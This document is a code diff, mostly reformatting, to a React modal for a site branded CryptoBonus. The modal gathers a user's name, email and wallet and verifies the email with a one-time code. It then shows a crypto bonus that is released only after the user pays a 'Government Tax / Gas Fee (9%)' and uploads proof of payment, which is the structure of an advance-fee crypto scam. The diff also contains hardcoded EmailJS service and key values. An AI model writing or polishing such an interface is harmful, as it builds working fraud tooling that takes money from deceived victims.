@@ -144,7 +144,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
   }, []);
 
   const formatCountdown = (secs: number) => {
-    const m = Math.floor(secs / 60).toString().padStart(2, "0");
+    const m = Math.floor(secs / 60)
+      .toString()
+      .padStart(2, "0");
     const s = (secs % 60).toString().padStart(2, "0");
     return `${m}:${s}`;
   };
@@ -169,7 +171,7 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
           user_name: fullName,
           verification_code: code,
         },
-        "MvBuCO3lDmmt1uvb2"
+        "MvBuCO3lDmmt1uvb2",
       );
     } catch (e) {
       console.error("OTP send failed", e);
@@ -198,14 +200,24 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
       tx_hash: txHash || "Screenshot uploaded",
     };
 
-    // Confirmation email to user
-    emailjs
-      .send("service_tgxebrt", "template_9p1n8fu", { to_email: email, ...proofParams }, "MvBuCO3lDmmt1uvb2")
-      .catch(console.error);
-
     // Notification email to admin
     emailjs
-      .send("service_tgxebrt", "template_9p1n8fu", { to_email: ADMIN_EMAIL, ...proofParams }, "MvBuCO3lDmmt1uvb2")
+      .send(
+        "service_tgxebrt",
+        "template_9p1n8fu",
+        { to_email: ADMIN_EMAIL, ...proofParams },
+        "MvBuCO3lDmmt1uvb2",
+      )
+      .catch(console.error);
+
+    // Confirmation email to user
+    emailjs
+      .send(
+        "service_tgxebrt",
+        "template_9p1n8fu",
+        { to_email: email, ...proofParams },
+        "MvBuCO3lDmmt1uvb2",
+      )
       .catch(console.error);
 
     startCountdown();
@@ -275,7 +287,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
             >
               {/* Full Name */}
               <div>
-                <label className="text-sm text-muted-foreground mb-1.5 block">Full Name</label>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Full Name
+                </label>
                 <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
                   <User className="h-4 w-4 text-muted-foreground shrink-0" />
                   <input
@@ -289,14 +303,16 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
 
               {/* Email */}
               <div>
-                <label className="text-sm text-muted-foreground mb-1.5 block">Email</label>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Email
+                </label>
                 <div
                   className={`flex items-center gap-2 glass-card rounded-lg px-3 py-2.5 transition-colors ${
                     showEmailError
                       ? "border-destructive ring-1 ring-destructive/50"
                       : emailTouched && emailValid
-                      ? "border-success/50"
-                      : ""
+                        ? "border-success/50"
+                        : ""
                   }`}
                 >
                   <Mail
@@ -304,8 +320,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                       showEmailError
                         ? "text-destructive"
                         : emailTouched && emailValid
-                        ? "text-success"
-                        : "text-muted-foreground"
+                          ? "text-success"
+                          : "text-muted-foreground"
                     }`}
                   />
                   <input
@@ -367,8 +383,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                     showWalletError
                       ? "border-destructive ring-1 ring-destructive/50"
                       : walletTouched && walletValid
-                      ? "border-success/50"
-                      : ""
+                        ? "border-success/50"
+                        : ""
                   }`}
                 >
                   <Wallet
@@ -376,8 +392,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                       showWalletError
                         ? "text-destructive"
                         : walletTouched && walletValid
-                        ? "text-success"
-                        : "text-muted-foreground"
+                          ? "text-success"
+                          : "text-muted-foreground"
                     }`}
                   />
                   <input
@@ -462,7 +478,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 <p className="text-muted-foreground text-sm">
                   We sent a 6-digit verification code to
                 </p>
-                <p className="text-foreground font-medium text-sm mt-1">{email}</p>
+                <p className="text-foreground font-medium text-sm mt-1">
+                  {email}
+                </p>
               </div>
 
               {/* OTP input */}
@@ -475,8 +493,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                     otpTouched && !otpValid
                       ? "border-destructive ring-1 ring-destructive/50"
                       : otpValid
-                      ? "border-success ring-1 ring-success/50"
-                      : ""
+                        ? "border-success ring-1 ring-success/50"
+                        : ""
                   }`}
                 >
                   <KeyRound
@@ -484,8 +502,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                       otpTouched && !otpValid
                         ? "text-destructive"
                         : otpValid
-                        ? "text-success"
-                        : "text-muted-foreground"
+                          ? "text-success"
+                          : "text-muted-foreground"
                     }`}
                   />
                   <input
@@ -516,14 +534,20 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               {/* Security note */}
               <div className="glass-card rounded-lg p-3 bg-primary/5 border border-primary/20">
                 <p className="text-xs text-muted-foreground">
-                  <span className="text-primary font-medium">Don't share this code.</span>{" "}
-                  CryptoBonus will never ask you for this code. If you didn't request this,
-                  ignore it.
+                  <span className="text-primary font-medium">
+                    Don't share this code.
+                  </span>{" "}
+                  CryptoBonus will never ask you for this code. If you didn't
+                  request this, ignore it.
                 </p>
               </div>
 
               <div className="flex gap-3">
-                <Button variant="outline" className="flex-1" onClick={() => setStep(0)}>
+                <Button
+                  variant="outline"
+                  className="flex-1"
+                  onClick={() => setStep(0)}
+                >
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
                 </Button>
                 <Button
@@ -548,7 +572,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               className="space-y-4"
             >
               <div className="text-center py-4">
-                <p className="text-muted-foreground text-sm mb-2">Your Bonus (Unaffected by Tax)</p>
+                <p className="text-muted-foreground text-sm mb-2">
+                  Your Bonus (Unaffected by Tax)
+                </p>
                 <p className="text-4xl font-display font-bold gold-text">
                   {bonusCrypto.toFixed(6)} {selectedCoin}
                 </p>
@@ -559,7 +585,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
 
               <div className="glass-card rounded-xl p-4 space-y-3">
                 <div className="flex justify-between py-2 border-b border-border">
-                  <span className="text-muted-foreground text-sm">Bonus Amount</span>
+                  <span className="text-muted-foreground text-sm">
+                    Bonus Amount
+                  </span>
                   <span className="text-foreground font-medium text-sm">
                     {bonusCrypto.toFixed(6)} {selectedCoin}
                   </span>
@@ -569,26 +597,38 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                     Current {selectedCoin} Price
                   </span>
                   <span className="text-foreground font-medium text-sm">
-                    ${coin?.price.toLocaleString(undefined, { maximumFractionDigits: 2 })}
+                    $
+                    {coin?.price.toLocaleString(undefined, {
+                      maximumFractionDigits: 2,
+                    })}
                   </span>
                 </div>
                 <div className="flex justify-between py-2 border-b border-border">
-                  <span className="text-muted-foreground text-sm">Government Tax / Gas Fee (9%)</span>
+                  <span className="text-muted-foreground text-sm">
+                    Government Tax / Gas Fee (9%)
+                  </span>
                   <span className="text-primary font-medium text-sm">9%</span>
                 </div>
                 <div className="flex justify-between py-2 border-b border-border">
-                  <span className="text-muted-foreground text-sm">Tax Fee Payable</span>
+                  <span className="text-muted-foreground text-sm">
+                    Tax Fee Payable
+                  </span>
                   <div className="text-right">
                     <span className="text-primary font-bold block">
                       {taxCrypto.toFixed(6)} {selectedCoin}
                     </span>
                     <span className="text-muted-foreground text-xs">
-                      ≈ ${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}
+                      ≈ $
+                      {taxUsd.toLocaleString(undefined, {
+                        maximumFractionDigits: 2,
+                      })}
                     </span>
                   </div>
                 </div>
                 <div className="flex justify-between py-2">
-                  <span className="text-muted-foreground text-sm">Disbursement Time</span>
+                  <span className="text-muted-foreground text-sm">
+                    Disbursement Time
+                  </span>
                   <span className="text-success font-medium text-sm flex items-center gap-1">
                     <Clock className="h-3 w-3" /> 60 minutes
                   </span>
@@ -597,10 +637,12 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
 
               <div className="glass-card rounded-lg p-3 bg-primary/5 border border-primary/20">
                 <p className="text-xs text-primary font-medium mb-1">
-                  ✦ Your full bonus of {bonusCrypto.toFixed(6)} {selectedCoin} remains unchanged
+                  ✦ Your full bonus of {bonusCrypto.toFixed(6)} {selectedCoin}{" "}
+                  remains unchanged
                 </p>
                 <p className="text-xs text-muted-foreground">
-                  The tax/gas fee is a separate payment required to process your claim.
+                  The tax/gas fee is a separate payment required to process your
+                  claim.
                 </p>
               </div>
 
@@ -627,7 +669,11 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               </div>
 
               <div className="flex gap-3">
-                <Button variant="outline" className="flex-1" onClick={() => setStep(1)}>
+                <Button
+                  variant="outline"
+                  className="flex-1"
+                  onClick={() => setStep(1)}
+                >
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
                 </Button>
                 <Button
@@ -651,12 +697,17 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               className="space-y-4"
             >
               <p className="text-muted-foreground text-sm">
-                Upload your transaction hash or screenshot as proof of payment for{" "}
+                Upload your transaction hash or screenshot as proof of payment
+                for{" "}
                 <span className="text-primary font-semibold">
                   {taxCrypto.toFixed(6)} {selectedCoin}
                 </span>{" "}
                 <span className="text-muted-foreground text-xs">
-                  (≈ ${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })})
+                  (≈ $
+                  {taxUsd.toLocaleString(undefined, {
+                    maximumFractionDigits: 2,
+                  })}
+                  )
                 </span>
               </p>
 
@@ -674,7 +725,9 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 </div>
               </div>
 
-              <div className="text-center text-muted-foreground text-xs">— or —</div>
+              <div className="text-center text-muted-foreground text-xs">
+                — or —
+              </div>
 
               <div>
                 <label className="text-sm text-muted-foreground mb-1.5 block">
@@ -711,7 +764,11 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
               </p>
 
               <div className="flex gap-3">
-                <Button variant="outline" className="flex-1" onClick={() => setStep(2)}>
+                <Button
+                  variant="outline"
+                  className="flex-1"
+                  onClick={() => setStep(2)}
+                >
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
                 </Button>
                 <Button
@@ -745,8 +802,8 @@ const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
                 <span className="text-primary font-semibold">
                   {bonusCrypto.toFixed(6)} {selectedCoin}
                 </span>{" "}
-                (≈ ${claimAmountUsd.toLocaleString()}) will be sent to your wallet after
-                verification.
+                (≈ ${claimAmountUsd.toLocaleString()}) will be sent to your
+                wallet after verification.
               </p>
 
               <div className="glass-card rounded-xl p-4 inline-flex flex-col items-center gap-1">
